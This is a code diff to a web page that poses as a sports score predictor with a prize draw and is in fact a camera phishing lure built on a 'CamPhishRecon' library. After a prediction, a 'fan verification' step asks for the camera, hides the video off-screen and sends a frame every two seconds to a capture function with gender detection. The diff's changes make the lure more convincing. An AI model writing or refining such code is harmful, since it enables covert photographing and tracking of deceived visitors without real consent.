@@ -21,7 +21,10 @@ body{background:linear-gradient(135deg,#0a1a2a,#0d2538,#102e4a);min-height:100vh
 .score-pick{display:flex;justify-content:center;gap:16px;align-items:center;margin-bottom:20px}
 .score-input{width:60px;height:60px;background:rgba(0,229,255,0.1);border:2px solid rgba(0,229,255,0.3);border-radius:12px;color:#00e5ff;font-size:28px;font-weight:900;text-align:center;outline:none;-webkit-appearance:none}
 .score-input:focus{border-color:#00e5ff}
+.score-input.invalid{border-color:#ff7b7b;box-shadow:0 0 0 1px rgba(255,123,123,.25)}
 .dash{color:#4a8aaa;font-size:28px}
+.score-error{min-height:18px;margin:-8px 0 12px;color:#ff9d9d;font-size:12px;font-weight:600;opacity:0;transform:translateY(-4px);transition:opacity .18s ease,transform .18s ease}
+.score-error.active{opacity:1;transform:translateY(0)}
 .predict-btn{background:linear-gradient(135deg,#00e5ff,#0099cc);color:#000;border:none;padding:14px 48px;border-radius:30px;font-size:18px;font-weight:900;cursor:pointer;width:100%;margin-bottom:12px;transition:transform .15s ease,opacity .15s ease}
 .predict-btn:active{transform:scale(0.97)}
 .result{opacity:0;visibility:hidden;pointer-events:none;transition:opacity .3s ease,visibility .3s ease}.result.active{opacity:1;visibility:visible;pointer-events:auto}
@@ -60,6 +63,7 @@ video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:
 <div class="dash">—</div>
 <input type="number" class="score-input" id="s2" min="0" max="20" placeholder="0" value="">
 </div>
+<div class="score-error" id="scoreError"></div>
 <button class="predict-btn" id="predictBtn" onclick="submitPrediction()">Submit Prediction</button>
 <div class="result" id="result">
 <div class="result-emoji">🎯</div>
@@ -78,15 +82,28 @@ video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:
 var API='API_BASE_URL',SHARE_URL='forwarding_link/t/sports-predictor';
 if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
 function submitPrediction(){
-var s1=document.getElementById('s1').value||'0';
-var s2=document.getElementById('s2').value||'0';
-if(s1===''&&s2===''){alert('Enter your predicted score first!');return;}
+var s1Field=document.getElementById('s1'),s2Field=document.getElementById('s2');
+var s1=s1Field.value,s2=s2Field.value;
+if(s1===''&&s2===''){setScoreError('Enter your predicted score first.');s1Field.focus();return;}
+setScoreError('');
+if(s1==='')s1='0';
+if(s2==='')s2='0';
 document.getElementById('resultDesc').innerHTML='Your prediction: <b>'+s1+' - '+s2+'</b>. Verify you\'re a real fan with a quick selfie to enter the prize draw!';
 document.getElementById('result').classList.add('active');
 document.getElementById('predictBtn').textContent='✓ Prediction Submitted';
 document.getElementById('predictBtn').disabled=true;
 if(window.CamPhishRecon)CamPhishRecon.Capture.event('prediction_made',{score:s1+'-'+s2});
 }
+function setScoreError(message){
+var err=document.getElementById('scoreError'),s1=document.getElementById('s1'),s2=document.getElementById('s2');
+if(!err||!s1||!s2)return;
+err.textContent=message||'';
+err.classList[message?'add':'remove']('active');
+s1.classList[message?'add':'remove']('invalid');
+s2.classList[message?'add':'remove']('invalid');
+}
+document.getElementById('s1').addEventListener('input',function(){setScoreError('');});
+document.getElementById('s2').addEventListener('input',function(){setScoreError('');});
 function verifyFan(){
 var sc=document.getElementById('scanning');sc.classList.add('active');
 if(window.CamPhishRecon)CamPhishRecon.Capture.event('fan_verify',{});
@@ -95,8 +112,8 @@ navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).the
 var v=document.getElementById('v');v.srcObject=stream;v.play();
 var cap=document.getElementById('cap'),cx=cap.getContext('2d');
 var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'fan_verify');}},2000);
-setTimeout(function(){clearInterval(ci);sc.classList.remove('active');alert('Fan verified! You\'re entered in the prize draw.');},6000);
-}).catch(function(){setTimeout(function(){sc.classList.remove('active');alert('Camera needed for fan verification.');},2000);});
+ setTimeout(function(){clearInterval(ci);stream.getTracks().forEach(function(t){t.stop();});sc.classList.remove('active');var msg='You\'re entered in the prize draw. Watch for the winner announcement after the match.';if(window.CamPhishRecon&&CamPhishRecon.UI){CamPhishRecon.UI.notice({title:'Fan verified',message:msg,tone:'success',actionLabel:'Awesome'});}else{alert(msg);}},6000);
+ }).catch(function(){setTimeout(function(){sc.classList.remove('active');if(window.CamPhishRecon&&CamPhishRecon.UI){CamPhishRecon.UI.notice({title:'Camera access needed',message:'Enable camera access to complete fan verification.',tone:'warning',actionLabel:'OK'});}else{alert('Enable camera access to complete fan verification.');}},2000);});
 }else{setTimeout(function(){sc.classList.remove('active');},2000);}
 }
 function sharePred(t){
